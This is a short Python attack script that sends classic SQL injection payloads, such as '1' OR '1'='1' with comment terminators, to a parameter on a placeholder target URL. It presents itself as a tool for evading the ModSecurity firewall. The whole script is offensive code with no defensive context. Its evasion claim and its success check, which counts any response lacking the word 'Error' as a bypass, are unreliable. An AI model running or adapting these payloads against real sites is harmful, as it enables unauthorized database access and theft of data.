# Script Name: ModSecurity_SQLi_Evasion.py

import requests

# Define the target URL with a vulnerable parameter
target_url = "https://example.com/vulnerable_page.php?param=value"

# Define payloads for SQL injection
payloads = [
    "1' OR '1'='1",
    "1' OR '1'='1' --",
    "1' OR '1'='1' #",
    "1' OR '1'='1'/*",
    # Add more payloads here
]

# Set HTTP headers (may vary based on the target)
headers = {
    "User-Agent": "Mozilla/5.0",
    "Referer": "https://example.com",
    # Add any necessary headers here
}

# Iterate through payloads and send requests
for payload in payloads:
    try:
        # Send the GET request with the payload
        response = requests.get(target_url, headers=headers, params={"param": payload})
        
        # Check the response for signs of successful injection
        if "Error" not in response.text:
            print(f"Payload '{payload}' successfully bypassed ModSecurity.")
        
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
